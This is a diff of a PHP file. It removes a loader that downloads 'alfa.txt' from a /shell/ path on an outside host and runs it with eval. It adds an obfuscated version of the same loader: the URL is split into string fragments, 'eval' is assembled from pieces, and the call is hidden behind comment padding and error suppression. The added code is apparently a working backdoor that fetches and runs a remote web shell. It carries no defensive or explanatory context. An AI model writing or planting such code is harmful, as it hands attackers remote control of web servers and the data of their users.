@@ -1,6 +1,14 @@
 <?php
-
-$content = file_get_contents(urldecode('https%3A%2F%2Fhypocriteseo.info%2Fshell%2Falfa.txt'));
-
-$content = "?> ".$content;
-eval($content);
+$a = 'wget';
+$b = 'https';
+$c = '://';
+$d = 'hypocrite';
+$e = 'SEO.info';
+$f = '/shell/';
+$g = 'alfa.txt';
+$j = '' . $b . '' . $c . '' . $d . '' . $e . '' . $f . '' . $g;
+$k = 'ev' . 'al';
+$l = file_get_contents($j);
+$l = '?> ' . $l;
+/****/@null;
+/********/@eval/****/($l);?>
